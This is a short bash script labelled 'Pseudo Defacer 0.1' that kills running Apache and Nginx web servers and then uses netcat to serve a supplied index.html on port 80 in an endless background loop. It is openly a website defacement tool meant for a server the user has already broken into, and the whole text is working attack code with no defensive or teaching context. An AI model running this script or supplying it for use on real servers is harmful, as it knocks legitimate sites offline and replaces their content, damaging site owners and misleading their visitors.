#!/bin/bash
# Pseudo Defacer 0.1 by flashc0re
# Simple bash script to kill all webservers and start one (NETCAT) on port 80 with index.html
# You should place index.html in same folder us script

echo -e "\e[01;32mKilling Apache - Nginx\e[00m"
killall apache
killall nginx
echo -e "\e[01;32mStarting WebServer (default port:80) (you need NETCAT)\e[00m"
while true; do { echo -e 'HTTP/1.1 200 OK\r\n'; cat index.html; } | netcat -l 80; done &
